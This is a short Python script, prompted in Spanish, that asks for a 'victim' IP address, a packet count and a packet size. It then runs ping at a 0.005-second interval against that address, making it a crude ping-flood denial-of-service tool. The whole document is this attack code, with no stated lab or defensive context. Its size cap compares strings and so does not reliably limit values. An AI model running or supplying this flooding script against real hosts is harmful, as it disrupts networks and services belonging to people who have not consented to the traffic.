
import subprocess

print("Direccion ip victima: ", end="")
ip_victima = input()


print("Numero de peticiones: ", end="")
peticiones = input()

print("Tamaño de peticiones: ", end="")
tamaño = input()

if tamaño > "1000":
    tamaño = "1000"



try:

    comman = ["ping", "-i", "0.005", "-c", str(peticiones), "-s", tamaño, ip_victima]

    resultado = subprocess.run(comman, stderr=subprocess.DEVNULL)

    if resultado.returncode == 0:
        print(resultado.stdout)
    else:
        print(f"Error al hacer ping a {ip_victima}. Código de retorno: {resultado.returncode}")
        print(resultado.stderr)

except Exception as e:
    print(f"Error: {e}")
